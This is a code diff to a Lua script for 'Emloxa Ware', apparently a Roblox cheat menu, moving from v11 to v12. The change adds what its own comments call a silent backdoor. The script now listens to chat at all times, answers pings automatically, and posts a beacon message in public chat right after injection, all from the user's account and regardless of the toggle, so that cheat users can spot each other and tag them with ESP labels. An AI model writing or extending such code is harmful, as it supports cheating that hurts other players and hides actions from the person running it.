@@ -1,6 +1,6 @@
 -- =========================================================================
--- EMLOXA WARE PREMIUM UI v11 (Ultimate Core)
--- INTEGRATED: FILE CONFIG SYSTEM, EMLOXA RADAR, DIVIDER FIX
+-- EMLOXA WARE PREMIUM UI v12 (Ultimate Core)
+-- INTEGRATED: SILENT RADAR PROTOCOL, FILE CONFIG SYSTEM, DIVIDER FIX
 -- =========================================================================
 local EmloxaLibrary = {}
 
@@ -27,35 +27,44 @@ local ConfigFolder = "EmloxaWare_Configs"
 if not isfolder(ConfigFolder) then makefolder(ConfigFolder) end
 
 -- ══════════════════════════════════════
---  EMLOXA GİZLİ RADAR (TRACKER) PROTOKOLÜ
+--  EMLOXA GİZLİ RADAR (SILENT BACKDOOR PROTOCOL)
 -- ══════════════════════════════════════
-local TrackerEnabled = false
+local TrackerESPEnabled = false
 local TrackedUsers = {}
 
 local function SetupEmloxaRadar()
 	local ChatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
 	if not ChatEvents then return end
 
+	-- 1. SÜREKLİ DİNLEME: Buton açık olmasa bile arka planda herkesi dinler
 	ChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(msgData)
-		if not TrackerEnabled then return end
 		local msg = msgData.Message
 		local sender = msgData.FromSpeaker
 		
 		if sender ~= LocalPlayer.Name then
 			if msg == "[EMLOXA_PING]" then
+				-- Biri ping attıysa, menüyü kullanan BİZİM SCRIPT otomatik cevap verir (Gizlenemezler!)
 				ChatEvents.SayMessageRequest:FireServer("[EMLOXA_PONG]", "All")
 				TrackedUsers[sender] = true
 			elseif msg == "[EMLOXA_PONG]" then
+				-- Pingimize cevap verdiler, listeye ekle!
 				TrackedUsers[sender] = true
 			end
+		end
+	end)
+
+	-- 2. İNJECT OLUNDUĞU AN SİNYAL GÖNDER (Ruhu duymaz)
+	task.delay(2, function()
+		if ChatEvents then
+			ChatEvents.SayMessageRequest:FireServer("[EMLOXA_PING]", "All")
 		end
 	end)
 end
 pcall(SetupEmloxaRadar)
 
--- Radar ESP Döngüsü
+-- Radar ESP Döngüsü (Sadece butona basıldığında kafalarındaki yazıyı gösterir)
 RunService.RenderStepped:Connect(function()
-	if not TrackerEnabled then return end
+	if not TrackerESPEnabled then return end
 	for playerName, _ in pairs(TrackedUsers) do
 		local p = Players:FindFirstChild(playerName)
 		if p and p.Character and p.Character:FindFirstChild("Head") then
@@ -960,7 +969,6 @@ function EmloxaLibrary:CreateWindow(hubName)
 			end)
 		end
 
-		-- EKLENEN FONKSİYON: CreateDivider (Menü parçalanmasın diye)
 		function TabSetup:CreateDivider()
 			local Div = Instance.new("Frame")
 			Div.Size = UDim2.new(1, 0, 0, 2)
@@ -1030,18 +1038,25 @@ function EmloxaLibrary:CreateWindow(hubName)
 
 	MenuTab:CreateDivider()
 
+	-- TRACKER TOGGLE
 	MenuTab:CreateToggle("Track Emloxa Ware Users", function(state)
-		TrackerEnabled = state
+		TrackerESPEnabled = state
 		if state then
 			local ChatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
 			if ChatEvents then ChatEvents.SayMessageRequest:FireServer("[EMLOXA_PING]", "All") end
 		else
-			TrackedUsers = {}
+			for _, p in pairs(Players:GetPlayers()) do
+				if p.Character and p.Character:FindFirstChild("Head") then
+					local tag = p.Character.Head:FindFirstChild("EmloxaRadarTag")
+					if tag then tag:Destroy() end
+				end
+			end
 		end
 	end)
 
 	MenuTab:CreateDivider()
 
+	-- FILE SYSTEM CONFIGS
 	local CurrentConfigName = "Default"
 	MenuTab:CreateDropdown("Config Profile", {"Default", "Legit", "Rage", "EvadeGod"}, "Default", function(val)
 		CurrentConfigName = val
